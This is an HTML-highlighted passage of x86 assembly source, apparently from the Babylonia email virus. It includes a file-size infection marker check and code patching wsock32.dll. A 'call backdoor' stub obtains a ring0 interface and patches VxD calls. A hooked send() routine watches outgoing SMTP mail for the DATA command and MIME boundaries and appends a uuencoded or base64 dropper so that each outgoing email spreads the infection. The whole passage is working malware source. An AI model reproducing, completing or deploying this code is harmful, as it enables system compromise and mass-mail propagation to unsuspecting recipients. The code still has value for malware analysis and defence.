       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                            </span><span class="sc1">;signal error</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">
  </span><span class="sc5">@@found</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">                       </span><span class="sc1">;convert to raw</span><span class="sc0">
  </span><span class="sc5">@@error</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">rva2raw</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">check_size</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">
       </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">                             </span><span class="sc1">;bigger than 2mb</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">1024</span><span class="sc0">
       </span><span class="sc6">jbe</span><span class="sc0"> </span><span class="sc5">@@error</span><span class="sc0">                             </span><span class="sc1">;smaller than 4kb</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;if((fsize mod 17) = 15)</span><span class="sc0">
       </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;lexo32 ;-)</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">                           </span><span class="sc1">;mov ax, ?</span><span class="sc0">
  </span><span class="sc5">@@error</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">check_size</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">pstart</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">                           </span><span class="sc1">;wsock32.dll code...</span><span class="sc0">

       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'C:\_'</span><span class="sc0">
</span><span class="sc5">driver</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">                          </span><span class="sc1">;drivername</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'.---'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">send</span><span class="sc0">   </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">init2</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">
     </span><span class="sc5">_send</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;jmp to hmem send</span><span class="sc0">
</span><span class="sc5">send</span><span class="sc0">   </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc5">init2</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">@@delta</span><span class="sc0">
  </span><span class="sc5">@@delta</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">@@delta</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">pstart</span><span class="sc4">)</span><span class="sc0">      </span><span class="sc1">;get delta in wsock32.dll</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">driver</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">pstart</span><span class="sc4">)]</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">@@byte</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">rol</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01111b</span><span class="sc0">                          </span><span class="sc1">;convert address to filename</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'A'</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">@@byte</span><span class="sc0">
       </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
  </span><span class="sc5">_getfattr</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                               </span><span class="sc1">;call backdoor</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">90909090h</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+((</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">pstart</span><span class="sc4">))]</span><span class="sc0">
       </span><span class="sc6">stosd</span><span class="sc0">                                   </span><span class="sc1">;clean calls to install</span><span class="sc0">
       </span><span class="sc6">stosb</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">                          </span><span class="sc1">;get ring0 interface code</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@damaged</span><span class="sc0">                            </span><span class="sc1">;cant get the interface</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_send</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">pstart</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">   </span><span class="sc1">;set jmps to my hmem handlers</span><span class="sc0">
  </span><span class="sc5">@@damaged</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">init2</span><span class="sc0">  </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc5">pend</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc9">this</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">


</span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">unpack.inc</span><span class="sc0">


</span><span class="sc5">ScanVxd</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0C0000018h</span><span class="sc4">]</span><span class="sc0">               </span><span class="sc1">;Control_Proc_0</span><span class="sc0">
  </span><span class="sc5">@@page</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">                        </span><span class="sc1">;check presence for</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000FFFh</span><span class="sc0">
       </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">@@check</span><span class="sc0">                              </span><span class="sc1">;to each new page encountered</span><span class="sc0">
  </span><span class="sc5">@@mov</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                          </span><span class="sc1">;B8 &lt;esi&gt;</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@page</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@page</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">                       </span><span class="sc1">;R0_xxx &lt;-- 0xFFFFFFFF</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@page</span><span class="sc0">
  </span><span class="sc5">@@check</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">28</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                                </span><span class="sc1">;esi = MEMORY_BASIC_INFO</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">00010134h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">vxd</span><span class="sc0">                                </span><span class="sc1">;VMMcall PageQuery</span><span class="sc0">
       </span><span class="sc6">bt</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">                     </span><span class="sc1">;mbi_state &amp; MEM_COMMIT</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">3</span><span class="sc4">+</span><span class="sc2">28</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">jc</span><span class="sc0"> </span><span class="sc5">@@mov</span><span class="sc0">                                </span><span class="sc1">;will not fault?</span><span class="sc0">
       </span><span class="sc6">popa</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ScanVxd</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">


     </span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0"> </span><span class="sc9">EQ</span><span class="sc0"> </span><span class="sc5">TRUE</span><span class="sc0">
</span><span class="sc5">dropname</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'C:\GOAT.EXE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc9">ELSE</span><span class="sc0">
</span><span class="sc5">dropname</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'C:\BABYLONIA.EXE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
     </span><span class="sc9">ENDIF</span><span class="sc0">


</span><span class="sc5">myname</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mem_temp</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">mem</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">sent</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">uudropper</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">uusize</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">b64dropper</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">b64size</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">


</span><span class="sc5">my_send</span><span class="sc0">  </span><span class="sc9">proc</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">init</span><span class="sc0">
       </span><span class="sc6">pusha</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">delta</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;send() buffer</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b9h</span><span class="sc0">
  </span><span class="sc5">socket_out</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                           </span><span class="sc1">;we're monitoring a specific socket?</span><span class="sc0">
       </span><span class="sc6">jecxz</span><span class="sc0"> </span><span class="sc5">@@all</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">     </span><span class="sc1">;if so, then make sure is our</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@monitor</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@done</span><span class="sc0">

  </span><span class="sc5">@@all</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'ATAD'</span><span class="sc0">                       </span><span class="sc1">;email is being send!</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@done</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;monitor this socket only now</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">socket_out</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">boundary</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc1">;init MIME fieldz</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">sent</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@done</span><span class="sc0">

  </span><span class="sc5">@@monitor</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">8</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+(</span><span class="sc2">1</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">            </span><span class="sc1">;size</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'.'</span><span class="sc0">                             </span><span class="sc1">;search .</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
  </span><span class="sc5">@@cont_dot</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">                          </span><span class="sc1">;not end_of_email yet</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@no_dot</span><span class="sc0">                         </span><span class="sc1">;so, check for MIME</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">dwo</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0a0d2e0ah</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@cont_dot</span><span class="sc0">                     </span><span class="sc1">;make sure is the end_of_email sign</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                          </span><span class="sc1">;ecx=size of buffer</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">uu_send</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                           </span><span class="sc1">;ready to infect next email</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">socket_out</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">@@done</span><span class="sc0">                              </span><span class="sc1">;send the .</span><span class="sc0">

  </span><span class="sc5">@@no_dot</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;monitor MIME emailz</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                                 </span><span class="sc1">;size-3, since we load DWORDs</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">js</span><span class="sc0"> </span><span class="sc5">@@done</span><span class="sc0">                               </span><span class="sc1">;buffer smaller than 2, exit!</span><span class="sc0">
  </span><span class="sc5">@@scan</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
       </span><span class="sc6">lodsd</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">20202020h</span><span class="sc0">               </span><span class="sc1">;eax=upcase of 1st 4 letterz</span><span class="sc0">
       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0bah</span><span class="sc0">
  </span><span class="sc5">boundary</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">                         </span><span class="sc1">;we already found the boundary?</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@boundary_found</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'NUOB'</span><span class="sc0">
       </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">@@bogus</span><span class="sc0">                             </span><span class="sc1">;maybe a boundary?</span><span class="sc0">
       </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+(</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">bound_</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">vcode</span><span class="sc4">)]</span><span class="sc0">
  </span><span class="sc5">@@loop_1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@done_1</span><span class="sc0">
       </span><span class="sc6">lodsb</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'a'</span><span class="sc0">
       </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">@@up</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'z'</span><span class="sc0">                             </span><span class="sc1">;check string</span><span class="sc0">
       </span><span class="sc6">ja</span><span class="sc0"> </span><span class="sc5">@@up</span><span class="sc0">
       </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc0">
  </span><span class="sc5">@@up</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc5">by</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">@@loop_1</span><span class="sc0">
  </span><span class="sc5">@@done_1</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">@@bogus</span><span class="sc0">
